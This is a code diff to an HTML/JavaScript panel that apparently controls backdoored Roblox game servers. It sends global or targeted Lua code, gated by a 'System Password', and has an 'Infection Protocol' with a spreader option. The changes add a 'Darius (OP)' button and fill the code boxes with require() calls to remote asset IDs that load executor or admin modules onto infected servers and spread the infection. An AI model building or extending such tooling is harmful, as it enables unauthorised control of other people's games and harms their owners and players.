@@ -47,6 +47,7 @@
                 <div style="margin-bottom:5px;">
                     <button class="rh-btn" onclick="ins(1)">Last Rig</button>
                     <button class="rh-btn" onclick="ins(2)">Require.EXE</button>
+                    <button class="rh-btn" onclick="ins(3)">Darius (OP)</button>
                 </div>
                 <input type="password" placeholder="System Password">
                 <textarea rows="6" placeholder="-- Global Lua Code"></textarea>
@@ -59,6 +60,7 @@
                 <div style="margin-bottom:5px;">
                     <button class="rh-btn" onclick="ins(1, true)">Last Rig</button>
                     <button class="rh-btn" onclick="ins(2, true)">Require.EXE</button>
+                    <button class="rh-btn" onclick="ins(3, true)">Darius (OP)</button>
                 </div>
                 <input type="password" placeholder="System Password">
                 <textarea rows="5" placeholder="-- Targeted Lua Code"></textarea>
@@ -69,7 +71,7 @@
                 <h2>Infection Protocol</h2>
                 <div style="margin-bottom:5px;">
                     <button class="rh-btn" onclick="setInf('Core')">Nexus Core</button>
-                    <button class="rh-btn" onclick="setInf('EXE')">EXE Spreader</button>
+                    <button class="rh-btn" onclick="setInf('Darius')">Darius Spreader</button>
                 </div>
                 <input type="password" placeholder="System Password">
                 <textarea id="inf_lua" rows="10" style="color:#30d158;">
@@ -115,13 +117,15 @@ print(" Infection Deployed")</textarea>
         
         function ins(type, isSingle){
             const box = document.querySelector(`#${isSingle?'s_exec':'m_exec'} textarea`);
-            box.value = type === 1 ? `require(132155655397653)("YOUR_NAME")` : `require(125992639027440)["Require.EXE by E God"]("YOUR_NAME")`;
+            if(type === 1) box.value = `require(132155655397653)("Darius")`;
+            if(type === 2) box.value = `require(125992639027440)["Require.EXE by E God"]("Darius")`;
+            if(type === 3) box.value = `require(127445614272366).op("Darius")`;
         }
 
         function setInf(type){
             const box = document.getElementById('inf_lua');
-            if(type === 'Core') box.value = `require(132155655397653)("SPREAD_CORE")`;
-            else box.value = `require(125992639027440)["Require.EXE by E God"]("SPREAD_EXE")`;
+            if(type === 'Core') box.value = `require(132155655397653)("Darius")`;
+            else box.value = `require(127445614272366).op("Darius")`;
         }
 
         async function push(tabId, tid){
@@ -150,8 +154,8 @@ print(" Infection Deployed")</textarea>
                 </div>`).join('');}
         }
 
-        setInterval(refresh,5000);
-        setInterval(()=>{document.getElementById('time').innerText=new Date().toLocaleTimeString()},1000);
+        setInterval(refresh, 5000);
+        setInterval(() => {document.getElementById('time').innerText = new Date().toLocaleTimeString()}, 1000);
         window.onload = refresh;
     </script>
 </body>
